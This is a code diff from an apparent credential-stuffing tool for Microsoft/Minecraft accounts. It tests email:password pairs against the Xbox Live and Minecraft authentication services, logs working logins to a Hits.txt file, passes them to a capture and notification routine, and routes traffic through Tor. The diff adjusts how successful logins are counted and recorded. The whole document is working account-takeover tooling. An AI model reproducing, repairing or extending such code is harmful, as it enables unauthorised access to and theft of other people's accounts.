@@ -268,7 +268,6 @@ def authenticate(email, password):
         token, session, port = get_xbox_rps(session, email, password, urlPost, sFTTag, port)
         if token is not None:
             hit = False
-            captured = False
             try:
                 xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                 js = xbox_login.json()
@@ -284,22 +283,14 @@ def authenticate(email, password):
                                 mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
                                 access_token = mc_login.json().get('access_token')
                                 if access_token is not None:
-                                    hit = True
                                     mc, capes = account(access_token, session)
                                     if mc != None:
-                                        captured = True
+                                        hit = True
                                         Capture.handle(mc, email, password, capes)
                             except: pass
                     except: pass
             except: pass
             if hit == False: validmail(email, password)
-            elif hit == True and captured == False:
-                hits+=1
-                cpm+=1
-                checked+=1
-                with open(f"results/{fname}/Hits.txt", 'a') as file: file.write(f"{email}:{password}\n")
-                if screen == "'2'": print(Fore.GREEN+f"Hit: No Name Set | {email}:{password}")
-                Capture.notify(email, password, "Not Set", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A")
         if proxytype == "'4'": stop_tor(port)
     except Exception as e:
         #print(e)
